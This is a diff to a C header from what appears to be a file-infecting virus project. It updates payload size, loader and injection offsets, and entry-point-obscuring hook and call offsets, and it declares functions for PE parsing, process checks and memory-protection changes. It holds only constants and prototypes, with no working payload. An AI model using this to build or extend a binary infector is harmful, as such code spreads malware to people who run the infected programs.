@@ -21,14 +21,26 @@
 # define BUF_SIZE 0x20
 # define BIS_SIZE 0x137
 # define LOADER_SIZE 0x60
-# define PAYLOAD_SIZE 0x2c36 - FT_MEMCPY_ADDR + 0x7
-# define MAIN_OFFSET 0x2b9c - FT_MEMCPY_ADDR
+# define PAYLOAD_SIZE 0x3068 - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x2fc9 - FT_MEMCPY_ADDR
 # define INJECT_SIZE LOADER_SIZE + SIGN_SIZE
 
-# define OFFSET_1 0x2069 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_2 0x2184 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_3 0x2391 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_4 0x2ba7 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_1 0x22e6 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_2 0x2401 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_3 0x260e + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_4 0x2fd9 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_5 0x14dd + BIS_SIZE - FT_MEMCPY_ADDR
+
+# define OFFSET_HOOK_1 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_1 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_2 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_2 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_3 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_3 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_4 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_4 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_5 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_5 0x0000 + BIS_SIZE - FT_MEMCPY_ADDR
 
 typedef struct		s_info
 {
@@ -79,6 +91,8 @@ void		epo_parsing(t_info *info);
 int			pe_parsing(t_info *info);
 void		patch_bis(t_info *info, int32_t nb);
 int			check_process(char *buf_path);
+
+void		mprotect_text(int prot);
 
 /*			**** LIB HANDLERS	****			*/
 void		ft_memcpy(void *dest, void *src, size_t size);
